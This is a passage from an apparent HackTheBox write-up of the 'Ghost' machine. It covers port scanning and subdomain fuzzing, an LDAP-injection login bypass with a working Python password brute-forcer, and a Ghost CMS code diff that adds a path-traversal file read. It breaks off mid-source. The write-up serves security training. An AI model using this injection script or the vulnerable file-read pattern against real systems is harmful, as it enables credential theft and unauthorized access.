---
title: HTB: Ghost
url: https://0xdf.gitlab.io/2025/04/05/htb-ghost.html
date: 2025-04-05T13:45:00+00:00
difficulty: Insane [50]
os: Windows
tags: htb-ghost, ctf, hackthebox, nmap, windows, active-directory, ubuntu, ghost, subdomain, ffuf, next-js, feroxbuster, adfs, ldap, ldap-injection, gitea, kerbrute, burp, burp-proxy, burp-repeater, python, python-requests, source-code, docker, rust, file-read, directory-traversal, command-injection, ssh, ssh-controlmaster, linux-ldap, winbind, kerberos, klist, netexec, bloodhound, bloodhound-python, responder, dnstool, netntlmv2, hashcat, readgmsapassword, saml, golden-saml, adfsdump, adfspoof, mssql, mssql-impersonation, mssql-linked-servers, mssql-openquery, xp-cmdshell, seimpersonate, godpotato, efspotato, defender, powerview, domain-trust, mimikatz, krbtgt, interdomain-trust-account, ticketer, service-ticket, dcsync, golden-ticket, rubeus, htb-certified
---

![Ghost](/img/ghost-cover.png)

Ghost starts with a few websites, including a Ghost blog, an internal site, and a Gitea instance. I’ll use LDAP injection to get into the blog site and brute force account passwords. From there, I’ll find the site source in Gitea and identify a file read / directory traversal in the custom code added to Ghost. I’ll use that to read an environment variable with an API key, allowing access to a custom API where there’s a command injection vulnerability. I’ll abuse that to get root access in an Ubuntu container. In that container, I’ll abuse a long running ControlMaster SSH session to get into the Ubuntu VM as the next user. I’ll use that user to add a DNS entry on the domain, allowing me to capture a NetNTLMv2 challenge / response, which I’ll crack to get access as the next user. This user has gMSA read access to the ADFS service account. As the ADFS user, I’ll abuse a Golden SAML attack to get access to the admin panel website. In that website, I’ll interact with the database to find impersonation on a linked server and get a shell after enabling xp\_cmdshell. That server is the DC of a subdomain of the main domain, and has bidirectional trust with the main domain. I’ll show both abusing that trust and a golden ticket to get access to the main machine.

## Box Info

| Name | [Ghost](https://hackthebox.com/machines/ghost)  [Ghost](https://hackthebox.com/machines/ghost) [Play on HackTheBox](https://hackthebox.com/machines/ghost) |
| --- | --- |
| Release Date | [13 Jul 2024](https://twitter.com/hackthebox_eu/status/1811437807480586279) |
| Retire Date | 05 Apr 2025 |
| OS | Windows Windows |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Ghost |
| Radar Graph | Radar chart for Ghost |
| First Blood User | 05:04:15[celesian celesian](https://app.hackthebox.com/users/114435) |
| First Blood Root | 05:02:28[NLTE NLTE](https://app.hackthebox.com/users/260094) |
| Creator | [tomadimitrie tomadimitrie](https://app.hackthebox.com/users/775445) |

## Recon

### nmap

`nmap` finds a bunch of open TCP ports:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-27 11:41 UTC
Nmap scan report for 10.10.11.24
Host is up (0.094s latency).
Not shown: 65508 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8008/tcp  open  http
8443/tcp  open  https-alt
9389/tcp  open  adws
49443/tcp open  unknown
49664/tcp open  unknown
49669/tcp open  unknown
49675/tcp open  unknown
55380/tcp open  unknown
59500/tcp open  unknown
59540/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.42 seconds
oxdf@hacky$ nmap -p 53,80,88,135,139,389,443,445,464,593,636,1433,2179,3268,3269,3389,5985,8008,8443,9389 -sCV 10.10.11.24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-27 11:43 UTC
Nmap scan report for 10.10.11.24
Host is up (0.094s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-27 11:45:36Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
443/tcp  open  https?
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RC0+
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-03-26T21:35:53
|_Not valid after:  2055-03-26T21:35:53
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2025-03-27T11:46:58+00:00; +2m01s from scanner time.
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Not valid before: 2025-03-25T21:33:00
|_Not valid after:  2025-09-24T21:33:00
|_ssl-date: 2025-03-27T11:46:58+00:00; +2m01s from scanner time.
| rdp-ntlm-info:
|   Target_Name: GHOST
|   NetBIOS_Domain_Name: GHOST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ghost.htb
|   DNS_Computer_Name: DC01.ghost.htb
|   DNS_Tree_Name: ghost.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2025-03-27T11:46:20+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8008/tcp open  http          nginx 1.18.0 (Ubuntu)
| http-robots.txt: 5 disallowed entries
|_/ghost/ /p/ /email/ /r/ /webmentions/receive/
|_http-title: Ghost
|_http-generator: Ghost 5.78
|_http-server-header: nginx/1.18.0 (Ubuntu)
8443/tcp open  ssl/http      nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=core.ghost.htb
| Subject Alternative Name: DNS:core.ghost.htb
| Not valid before: 2024-06-18T15:14:02
|_Not valid after:  2124-05-25T15:14:02
| http-title: Ghost Core
|_Requested resource was /login
| tls-nextprotoneg:
|_  http/1.1
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC01; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 2m00s, deviation: 0s, median: 2m00s
| smb2-time:
|   date: 2025-03-27T11:46:19
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.29 seconds

```

I’ll triage these into groups:
- Standard Windows DC: DNS (53), Kerberos (88), RPC (135), NetBios (139), LDAP (389, 3269), LDAPS (636, 3269), SMB (445)
- Web Servers: HTTP (80, 8008), HTTPS (443, 8443)
- MSSQL (1433)

The server headers on TCP 8008 suggest an Ubuntu server, which is interesting for sure.

The box leaks the domain name `ghost.htb` and the hostname `DC01`. I’ll add these to my `hosts` file:

```
10.10.11.24    DC01 DC01.ghost.htb ghost.htb

```

### Website - TCP 80

#### Site

The site just returns 404 when fetched with IP or `ghost.htb`:

![image-20250327165229029](/img/image-20250327165229029.png)

#### Tech Stack

The HTTP response headers show a server of `Microsoft-HTTPAPI/2.0`:

```

HTTP/1.1 404 Not Found
Content-Type: text/html; charset=us-ascii
Server: Microsoft-HTTPAPI/2.0
Date: Thu, 27 Mar 2025 20:53:49 GMT
Connection: close
Content-Length: 315

```

This is a kernel-mode HTTP server used by various Microsoft products .

I’ll try both a subdomain fuzz with `ffuf` and a `feroxbuster` directory brute force, but both turn up empty.

### HTTPS - TCP 443

I can’t even connect to this site. I’m able to complete the TCP handshake, but then when TLS sends the Client Hello packet, the server responds with a RST packet, ending the connection.

Shortly, while enumeration HTTPS on 8443, I’ll see that this site is `fereration.ghost.htb` and manages the ADFS login.

### HTTP - TCP 8008

#### Site

This server returns a page for a blog on the supernatural:

![image-20250327171140253](/img/image-20250327171140253.png)

There’s a single post but it’s not super interesting.

#### Tech Stack

The HTTP response headers show a different server here:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 27 Mar 2025 21:19:46 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
X-Powered-By: Express
Cache-Control: public, max-age=0
ETag: W/"1dfc-8JAqr3JbS36beKtjCBtacZR50jE"
Vary: Accept-Encoding
Content-Length: 7676

```

It’s likely a VM running on the Windows host.

The blog says in the footer that it’s “Powered by [Ghost](https://ghost.org/)”, which describes itself as “Independent technology for modern publishing.”

#### Other Paths

Brute forcing paths with `feroxbuster` leads to a flood of errors. `nmap` did identify a `robots.txt` file:

```

User-agent: *
Sitemap: http://ghost.htb/sitemap.xml
Disallow: /ghost/
Disallow: /p/
Disallow: /email/
Disallow: /r/
Disallow: /webmentions/receive/

```

`/ghost` leads to the admin panel login:

![image-20250328105503740](/img/image-20250328105503740.png)

The others return the Ghost 404 page.

### intranet.ghost.htb - TCP 8008

#### Subdomain Fuzz

I’ll fuzz the TCP 8008 webserver to see if there is any host-based routing. It’s pretty slow, but the subdomain it finds comes out very quickly:

```

oxdf@hacky$ ffuf -u http://ghost.htb:8008 -H "Host: FUZZ.ghost.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://ghost.htb:8008
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.ghost.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

intranet                [Status: 307, Size: 3968, Words: 52, Lines: 1, Duration: 892ms]
#www                    [Status: 400, Size: 166, Words: 6, Lines: 8, Duration: 99ms]
#mail                   [Status: 400, Size: 166, Words: 6, Lines: 8, Duration: 93ms]
:: Progress: [19966/19966] :: Job [1/1] :: 22 req/sec :: Duration: [0:17:03] :: Errors: 0 ::

```

I’ll add that to my `hosts` file:

```
10.10.11.24 DC01 DC01.ghost.htb ghost.htb intranet.ghost.htb

```

#### Site

The site redirects to `/login` which presents a login page:

![image-20250327205410510](/img/image-20250327205410510.png)

#### Tech Stack

The HTTP response headers are interesting:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 28 Mar 2025 13:05:35 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Url, Accept-Encoding
X-Powered-By: Next.js
Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
Content-Length: 5848

```

There is an nginx instance doing the virtual host routing, and this application is written in Next.js. The [404 page matches](/cheatsheets/404#nextjs):

![image-20250328090550195](/img/image-20250328090550195.png)

I took a look to see if I could exploit [CVE-2025-29927](https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware), but didn’t get anywhere. It is a vulnerable version of Next.js, but the application isn’t using middleware, and thus the exploit doesn’t apply.

The POST request for logging in is interesting:

```

POST /login HTTP/1.1
Host: intranet.ghost.htb:8008
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Referer: http://intranet.ghost.htb:8008/login
Next-Action: c471eb076ccac91d6f828b671795550fd5925940
Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D
Content-Type: multipart/form-data; boundary=----geckoformboundary329191012f2821275b6fc41335be947a
Content-Length: 946
Origin: http://intranet.ghost.htb:8008
Connection: keep-alive
Cookie: connect.sid=s%3A2427sGcDAf62kS8px0lnsIXpDI9HTetp.2CevS5%2FuPb7NL8D0he4ySnRmAe45kS8O9%2BomKOAMJXk
------geckoformboundary329191012f2821275b6fc41335be947a
Content-Disposition: form-data; name="1_$ACTION_REF_1"
------geckoformboundary329191012f2821275b6fc41335be947a
Content-Disposition: form-data; name="1_$ACTION_1:0"

{"id":"c471eb076ccac91d6f828b671795550fd5925940","bound":"$@1"}
------geckoformboundary329191012f2821275b6fc41335be947a
Content-Disposition: form-data; name="1_$ACTION_1:1"

[{}]
------geckoformboundary329191012f2821275b6fc41335be947a
Content-Disposition: form-data; name="1_$ACTION_KEY"

k2982904007
------geckoformboundary329191012f2821275b6fc41335be947a
Content-Disposition: form-data; name="1_ldap-username"

admin
------geckoformboundary329191012f2821275b6fc41335be947a
Content-Disposition: form-data; name="1_ldap-secret"

admin
------geckoformboundary329191012f2821275b6fc41335be947a
Content-Disposition: form-data; name="0"

[{},"$K1"]
------geckoformboundary329191012f2821275b6fc41335be947a--

```

Specifically, the username and password fields are named `1_ldap-username` and `1_ldap_secret` respectively. That heavily suggests this application is using LDAP for authentication.

#### Directory Brute Force

I’ll use `feroxbuster` to look for other paths on this webserver:

```

oxdf@hacky$ feroxbuster -u http://intranet.ghost.htb:8008
                                                                                                                                       
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://intranet.ghost.htb:8008
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l      122w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
307      GET        0l        0w        0c http://intranet.ghost.htb:8008/logout => http://intranet.ghost.htb:8008/login
308      GET        1l        1w       19c http://intranet.ghost.htb:8008/_next/static/media/ => http://intranet.ghost.htb:8008/_next/static/media
308      GET        1l        1w       20c http://intranet.ghost.htb:8008/_next/static/chunks/ => http://intranet.ghost.htb:8008/_next/static/chunks
308      GET        1l        1w       17c http://intranet.ghost.htb:8008/_next/static/css/ => http://intranet.ghost.htb:8008/_next/static/css
308      GET        1l        1w        6c http://intranet.ghost.htb:8008/_next/ => http://intranet.ghost.htb:8008/_next
308      GET        1l        1w       13c http://intranet.ghost.htb:8008/_next/static/ => http://intranet.ghost.htb:8008/_next/static
200      GET        1l     2161w   104463c http://intranet.ghost.htb:8008/_next/static/chunks/938-67a376a0d283b41e.js
308      GET        1l        1w       30c http://intranet.ghost.htb:8008/_next/static/chunks/app/login/ => http://intranet.ghost.htb:8008/_next/static/chunks/app/login
308      GET        1l        1w        5c http://intranet.ghost.htb:8008/font/ => http://intranet.ghost.htb:8008/font
308      GET        1l        1w       10c http://intranet.ghost.htb:8008/multipart/ => http://intranet.ghost.htb:8008/multipart
308      GET        1l        1w       24c http://intranet.ghost.htb:8008/_next/static/chunks/app/ => http://intranet.ghost.htb:8008/_next/static/chunks/app
200      GET        1l        4w      463c http://intranet.ghost.htb:8008/_next/static/chunks/main-app-857f45503ab14ec1.js
200      GET        1l       74w     3575c http://intranet.ghost.htb:8008/_next/static/chunks/webpack-1982a2190e71c4ad.js
200      GET        3l      503w    60137c http://intranet.ghost.htb:8008/_next/static/css/ef974036adb18fac.css
200      GET        1l     1821w    91460c http://intranet.ghost.htb:8008/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js
200      GET      179l     1009w    84267c http://intranet.ghost.htb:8008/_next/static/media/c9a5bc6a7c948fb0-s.p.woff2
200      GET        1l       45w     2207c http://intranet.ghost.htb:8008/_next/static/chunks/app/login/page-520a39fac88afb1a.js
200      GET        1l     3115w   171902c http://intranet.ghost.htb:8008/_next/static/chunks/fd9d1056-6e338ff29dbb467d.js
307      GET        1l       52w     3968c http://intranet.ghost.htb:8008/ => http://intranet.ghost.htb:8008/login
200      GET        1l      113w     5848c http://intranet.ghost.htb:8008/login
307      GET        1l       52w     4715c http://intranet.ghost.htb:8008/forum => http://intranet.ghost.htb:8008/login
307      GET        1l       52w     4712c http://intranet.ghost.htb:8008/news => http://intranet.ghost.htb:8008/login
307      GET        1l       52w     4716c http://intranet.ghost.htb:8008/users => http://intranet.ghost.htb:8008/login
307      GET        1l       52w     4724c http://intranet.ghost.htb:8008/profile => http://intranet.ghost.htb:8008/login
404      GET        0l        0w        0c http://intranet.ghost.htb:8008/lnk
404      GET        0l        0w        0c http://intranet.ghost.htb:8008/Enterprise
[####################] - 16m    30024/30024   0s      found:26      errors:1813   
[####################] - 16m    30000/30000   31/s    http://intranet.ghost.htb:8008/ 

```

It finds some stuff, but the interesting stuff seems to be returning 307 redirects to `/login`.

### HTTPS - TCP 8443

#### Site

This site is titled “Ghost Core”, and has a login button:

![image-20250328104211419](/img/image-20250328104211419.png)

The button goes to `/api/login`, which returns a 302 redirect to `https://federation.ghost.htb/adfs/ls/?SAMLRequest=...[snip]...`. This presents another login page:

![image-20250328105219477](/img/image-20250328105219477.png)

#### Tech Stack

The TLS certificate for the site holds the name `core.ghost.htb`:

![image-20250327171551045](/img/image-20250327171551045.png)

## Shell as root in backend Container

### intranet LDAP Injection

#### Login Bypass

The `intranet.ghost.htb` site suggests it’s using LDAP for authentication. A quick check for LDAP injection would be to try `*` for both, and see if it is handled as a wildcard. It logs in as kathryn.holland:

![image-20250328105857200](/img/image-20250328105857200.png)

#### Site

The site has some information worth noting for later.

There is an ongoing migration from Gitea to Bitbucket. Domain logins to Gitea have been disabled, and login is only allowed by the gitea\_temp\_principal account, and the password is stored in LDAP.

justin.bradley has a post on the “Forum” tab complaining about not being able to access `bitbucket.ghost.htb`, which will come up in two different steps later in the box:

![image-20250328180215157](/img/image-20250328180215157.png)

There’s a list of domain usernames and their groups on the “Users” tab:

![image-20250328110215443](/img/image-20250328110215443.png)

A quick run with `kerbrute` shows these are all valid usernames on the domain:

```

oxdf@hacky$ kerbrute userenum -d ghost.htb -v users.txt --dc dc01.ghost.htb

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/28/25 - Ronnie Flathers @ropnop

2025/03/28 15:23:11 >  Using KDC(s):
2025/03/28 15:23:11 >   dc01.ghost.htb:88

2025/03/28 15:23:11 >  [+] VALID USERNAME:       kathryn.holland@ghost.htb
2025/03/28 15:23:11 >  [+] VALID USERNAME:       justin.bradley@ghost.htb
2025/03/28 15:23:11 >  [+] VALID USERNAME:       jason.taylor@ghost.htb
2025/03/28 15:23:11 >  [+] VALID USERNAME:       robert.steeves@ghost.htb
2025/03/28 15:23:11 >  [+] VALID USERNAME:       intranet_principal@ghost.htb
2025/03/28 15:23:11 >  [+] VALID USERNAME:       arthur.boyd@ghost.htb
2025/03/28 15:23:11 >  [+] VALID USERNAME:       cassandra.shelton@ghost.htb
2025/03/28 15:23:11 >  [+] VALID USERNAME:       florence.ramirez@ghost.htb
2025/03/28 15:23:11 >  [+] VALID USERNAME:       beth.clark@ghost.htb
2025/03/28 15:23:11 >  [+] VALID USERNAME:       charles.gray@ghost.htb
2025/03/28 15:23:11 >  [+] VALID USERNAME:       gitea_temp_principal@ghost.htb
2025/03/28 15:23:11 >  Done! Tested 11 usernames (11 valid) in 0.194 seconds

```

The “Profile” tab has a form to change the current user’s “secret”:

![image-20250328110348489](/img/image-20250328110348489.png)

#### LDAP Injection Password Brute Force

I’ll kick the login request over to Burp Repeater and remove headers and form data until I’m down to the minimal request that still works. With the wrong password, it returns 200 with an error:

![image-20250328114037438](/img/image-20250328114037438.png)

A successful login sets a cookie and redirects with a 303:

![image-20250328114117513](/img/image-20250328114117513.png)

Now I can write a loop that will brute force the password for a user:

```

import requests
import string
import sys

headers = {"Next-Action": "c471eb076ccac91d6f828b671795550fd5925940"}
username = sys.argv[1] if len(sys.argv) > 1 else "gitea_temp_principal"
password = ""
while True:
    for c in string.printable[:-5]:
        print(f"\rPassword for {username}: {password}{c}", end="")
        files = {
            "1_ldap-username": (None, username),
            "1_ldap-secret": (None, f"{password}{c}*"),
            "0": (None, '[{},"$K1"]'),
        }

        resp = requests.post(
            'http://intranet.ghost.htb:8008/login',
            headers=headers,
            files=files,
        )
        if resp.status_code == 303:
            password += c
            break
    else:
        print()
        break

```

This doesn’t handle special characters, but it doesn’t seem to matter. It’s a bit slow, but within just over a minute, it finds the password for gitea\_temp\_principal:

```

oxdf@hacky$ time python ldap_brute.py 
Password for gitea_temp_principal: szrr8kpc3z6onlqf 

real    1m35.925s
user    0m0.584s
sys     0m0.190s

```

I can brute-force other LDAP attributes as well, but there’s nothing very interesting or useful for continuing to exploit Ghost.

### gitea.ghost.htb

#### Find Domain

The post on the forum mentions the domain for Bitbucket, but not for Gitea:

![image-20250328115832944](/img/image-20250328115832944.png)

Still, I can take an educated guess that maybe it’s `gitea.ghost.htb`, and that works! I’ll add it to my `hosts` file:

```
10.10.11.24 DC01 DC01.ghost.htb ghost.htb intranet.ghost.htb gitea.ghost.htb federation.ghost.htb gitea.ghost.htb

```

If I had bruted-forced more earlier, I might have found this as well.

Now it loads on `http://gitea.ghost.htb:8008/`:

![image-20250328120510835](/img/image-20250328120510835.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

#### Repos

Without auth, there are no repositories available. There are two users:

![image-20250328121746474](/img/image-20250328121746474.png)

There’s not much else here unauthenticated. The creds for gitea\_temp\_principal work to log in, and now there’s two repos:

![image-20250328123046487](/img/image-20250328123046487.png)

### ghost-dev/blog

#### Repo

The blog repo is for the main website on 8008:

![image-20250328125659188](/img/image-20250328125659188.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

The readme file has some interesting information:

![image-20250328141245669](/img/image-20250328141245669.png)
1. There is a shared key between the intranet and the blog named `DEV_INTRANET_KEY` stored in an environment variable (as seen above).
2. This is a modified version of GhostCMS, specifically the `posts-public.js` file.
3. There’s a public API that needs a key, which is “a5af628828958c976a3b6cc81a”.

#### Docker

It’s a Dockerfile for running the site in a container:

```

FROM ghost:5-alpine

RUN ln -s /dev/null /root/.bash_history
RUN ln -s /dev/null /home/node/.bash_history

RUN mkdir /var/lib/ghost/extra
RUN echo 659cdeec9cd6330001baefbf > /var/lib/ghost/extra/important

COPY posts-public.js /var/lib/ghost/current/core/server/api/endpoints/posts-public.js

CMD ["node", "current/index.js"]

```

It symlinks two `.bash_history` files to `/dev/null`, and then write a hash into `/var/lib/ghost/extra/important`. It copies a file `post-public.js` into the Ghost CMS files, which is the previously mentioned customization from the open source version. It then runs `node` to start the blog.

There’s also a `docker-compose.yml` file for setting up environment variables and ports, as well as mapping the volume into the container so that Ghost has content to show:

```

version: '3.1'

services:
  ghost:
    build: .
    container_name: ghost
    restart: always
    ports:
      - 4000:2368
    environment:
      database__client: sqlite3
      database__connection__filename: "content/data/ghost.db"
      database__useNullAsDefault: true
      database__debug: false
      url: http://ghost.htb
      NODE_ENV: production
      DEV_INTRANET_KEY: "redacted"
    volumes:
      - ghost:/var/lib/ghost/content

volumes:
  ghost:
  db:

```

It’s using SQLite and give the DB path. There’s a “redacted” env variable `DEV_INTRANET_KEY` that seems interesting. I suspect at this point that it probably is really redacted (but it could be the string “redacted” as well.)

#### posts-public.js

Ghost [Version 5.80.0](https://github.com/TryGhost/Ghost/releases/tag/v5.80.0) released in March 2024, four months before Ghost released on HTB. I’ll get [that version](https://github.com/TryGhost/Ghost/blob/v5.115.0/ghost/core/core/server/api/endpoints/posts-public.js) of `post-public` on GitHub. I can’t say that’s the version on Ghost, but it should be close. I’ll save that and the Ghost version, and see the diff:

```

oxdf@hacky$ diff posts-public.js posts-public-ghost.js 
103c103
<         query(frame) {
---
>         async query(frame) {
108c108,117
<             return postsService.browsePosts(options);
---
>             const posts = await postsService.browsePosts(options);
>             const extra = frame.original.query?.extra;
>             if (extra) {
>                 const fs = require("fs");
>                 if (fs.existsSync(extra)) {
>                     const fileContent = fs.readFileSync("/var/lib/ghost/extra/" + extra, { encoding: "utf8" });
>                     posts.meta.extra = { [extra]: fileContent };
>                 }
>             }
>             return posts;
174a184
> 

```

There’s a single call made `async`, but also this extra processing. It is taking the result of `postsService.browsePosts(options)` and instead of just returning it, it’s processing this `extra` parameter from the query. It seems to take a file from `/var/lib/ghost/extra` and include its contents as metadata.

There’s also no sanitization being done, so with access to this endpoint, I should be able to walk the entire filesystem.

### gohst-dev/intranet

#### Repo

The repo has a `docker-compose.yml` file, a README, and two directories:

![image-20250328151956806](/img/image-20250328151956806.png)

The README shows the API path:

> We are adding new features to integrate the blog and the intranet. See the blog repo for more details.
>
> Until development is done, we will expose the dev API at `http://intranet.ghost.htb/api-dev`.

It seems that URL is exposed directly.

#### frontend

The `frontend` directory has a Next.js application:

![image-20250328152247996](/img/image-20250328152247996.png)

`frontend/src/app/(dashboard)/layout.tsx` shows where the auth is applied with accessing the dashboard:

```

import DashboardLayoutNavigation from "@/app/(dashboard)/layoutNavigation";
import { useUser } from "@/hooks/useUser";
import { redirect } from "next/navigation";
import React from "react";

export default function DashboardLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  const user = useUser();
  if (!user) {
    redirect("/login");
  }

  return <DashboardLayoutNavigation>{children}</DashboardLayoutNavigation>;
}

```

There’s a hook that does that same thing:

```

import { cookies } from "next/headers";

interface Jwt {
  user: {
    username: string;
  };
}

export function useUser(): string | null {
  const cookieStore = cookies();
  const token = cookieStore.get("token");
  if (!token) {
    return null;
  }
  return (
    JSON.parse(
      Buffer.from(token.value.split(" ")[1].split(".")[1], "base64").toString(),
    ) as Jwt
  )["user"]["username"];
}

```

Auth is done here and not in middleware, which explains why I couldn’t exploit CVE-2025-29927.

The rest is basically the site that I already accessed. `frontend/src/helpers/fetch.ts` has the `apiFetch` function:

```

export async function apiFetch(
  path: string,
  options?: RequestInit & ApiFetchExtraOptions,
) {
  const { headers, noCredentials, ...otherOptions } = options ?? {
    headers: [],
  };

  return fetch("http://backend:8000" + path, {
    ...(!noCredentials
      ? {
          credentials: "include",
          headers: {
            Cookie: `token=${cookies().get("token")!.value}`,
            ...headers,
          },
        }
      : {}),
    cache: "no-cache",
    ...otherOptions,
  });
}

```

This is what the pages use to get data to display on the page.

#### backend

The `backend` folder is a Rust application:

![image-20250328153044282](/img/image-20250328153044282.png)

Files in `backend/src/api` have the functions that the frontend uses. For example, `login.rs` has functions for handling login:

```

#[post("/login", data = "<body>")]
pub async fn login(body: Json<LoginRequest>, cookies: &CookieJar<'_>) -> anyhow::Result<(), RouteErrorRocket> {
    let username = ldap_connect(&body.ldap_username, &body.ldap_secret).await?;
    let claim = UserClaim::sign(UserClaim {
        username: username.to_string(),
    });

    let mut cookie = Cookie::new("token", format!("Bearer {}", claim));
    let mut now = OffsetDateTime::now_utc();
    now += Duration::days(1);
    cookie.set_expires(now);

    cookies.add(cookie);

    Ok(())
}

```

`ldap_connect` has the LDAP injection exploited [earlier](#intranet-ldap-injection):

```

async fn ldap_connect(username: &String, secret: &String) -> anyhow::Result<String, RouteErrorRocket> {
    let mut ldap = ldap_bind().await?;

    let dn = "CN=Users,DC=ghost,DC=htb";
